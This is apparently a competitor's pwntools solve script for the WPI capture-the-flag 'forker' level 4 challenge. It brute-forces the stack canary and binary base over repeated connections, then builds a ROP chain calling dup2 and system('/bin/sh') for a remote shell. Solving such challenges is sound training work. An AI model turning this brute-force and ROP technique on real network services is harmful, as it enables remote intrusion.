'''
$ ls
flag.txt
forker.level4
run_problem.sh
$ cat flag.txt
WPI{God_dammit_you_guys_learned_brop_for_real_this_time}
'''

from pwn import *
import sys, time

### Config ###
filename = './forker.level3'
rhost = "forker4.wpictf.xyz"
#rhost = "forker4-2.wpictf.xyz"
rport = 31337

### Binary ###
context.binary = filename
binary = ELF(filename)

### Context ###
#context.arch=elf.arch
context.log_level='INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

### Def function area ###


### Start exploit ###
if len(sys.argv) == 1:
    rhost = "localhost"
    p = remote("localhost", rport)
else:
    p = remote(rhost,rport)

canary = ''
saved_canary = ''

# canary leak
retry = True

while retry:
    for i in xrange(8):
        for byte in xrange(0x100):
            if byte == 0x0a:
                continue
            canary = saved_canary + p8(byte)
            p.recvuntil("Password:")
            payload = "A" * 72
            payload += canary
            p.sendline(payload)
            try:
                res = p.recv()
                if "You failed to get a correct password!" in res:
                    log.info("found : " + hex(byte))
                    saved_canary += p8(byte)
                    p.close()
                    p = remote(rhost, rport)
                    break
            except:
                canary = saved_canary
                log.info("try : " + hex(byte))
                #log.info("fail canary : " + saved_canary)
                p.close()
                p = remote(rhost, rport)
    log.info(saved_canary.encode("hex"))
    break

#local_canary = "0059e3d131b014ef".decode("hex")     # 31337
local_canary = saved_canary     # 31339

# binary leak

binary_base = ''
saved_binary_base = '\x89'

offset = 0x78
while retry:
    for i in xrange(5):
        for byte in xrange(0x100):
            if byte == 0x0a:
                continue
            binary_base = saved_binary_base + p8(byte)
            p.recvuntil("Password:")
            payload = "A" * 72
            payload += saved_canary
            payload += p32(4) * ((0x78 - len(payload))/4)
            payload += binary_base
            p.sendline(payload)

            try:
                res = p.recv(timeout=2)
                print res
                if "You failed to get a correct password!" in res:
                    log.info("found : " + hex(byte))
                    saved_binary_base += p8(byte)
                    p.close()
                    p = remote(rhost, rport)
                    break
            except:
                binary_base = saved_binary_base
                log.info("fail bbase : " + hex(byte))
                p.close()
                p = remote(rhost, rport)
    log.info("binary base : " + saved_binary_base.encode("hex"))
    log.info("canary : " + saved_canary.encode("hex"))
    break

base_offset = 0xa89
#base = 0x55cbe23eba89 - base_offset      # 31339
bbase = int("0x"+saved_binary_base[::-1].encode("hex"), 0)
base = bbase - base_offset      # remote

log.info(base)

pop1rdi = base + 0xd52        # : pop rdi; ret;
pop2rsi = base + 0xd50        # : pop rsi; pop r15; ret;
ret = base + 0xd4d
dprintf = base + 0x955
puts_got = base + 0x202118

# gadget leak
pop2rsi = base + 0xdc1
pop1rdi = base + 0xdc3
while retry:
    for i in xrange(1):
        for byte in xrange(0x100):
            if byte == 0x0a:
                continue
            p.recvuntil("Password:")
            payload = "A" * 72
            payload += saved_canary
            payload += p32(4) * ((0x78 - len(payload))/4)
            payload += p64(pop1rdi) + p64(4)     # find rdi
            payload += p64(pop2rsi) + p64(base + 0x202000 + byte * 8) * 2     # find rdi
            payload += p64(base + 0xa89 + 20)
            p.sendline(payload)

            try:
                res = p.recv(timeout=0.5)
                print res

                if "AAAAAAAAA" in res:
                    log.info("dprintf found : " + hex(base + 0x202000 + byte * 8))
                    p.close()
                    p = remote(rhost, rport)
                    #break

            except:
                log.info("fail dprintf : " + hex(base + 0x202000 + byte *
 8))
                p.close()
                p = remote(rhost, rport)
    log.info("binary base : " + hex(base))
    log.info("canary : " + saved_canary.encode("hex"))
    log.info("got : " + hex(base + 0x202000 + byte * 8))
    break

payload = "A" * 72 + saved_canary
payload += p32(4) * ((0x78 - len(payload))/4)
payload += p64(base + 0x981)
#p.recvuntil("Password:")
#p.sendline(payload)

#leak = u64(p.recv(6).ljust(8, "\x00"))
#print hex(leak)

leak = 0x7fd129213460
libc_base = leak - 0x78460
system = libc_base + 0x47dc0
dup2 = libc_base + 0x1048e0
binsh = libc_base + 0x1a3f20

# exploit

buf = "A" * 72 + local_canary + p64(ret) * 8
buf += p64(pop1rdi) + p64(4)
buf += p64(pop2rsi) + p64(0) * 2
buf += p64(dup2)
buf += p64(pop1rdi) + p64(4)
buf += p64(pop2rsi) + p64(1) * 2
buf += p64(dup2)
buf += p64(pop1rdi) + p64(binsh) + p64(system)
#p.sendline(buf)

p.interactive()
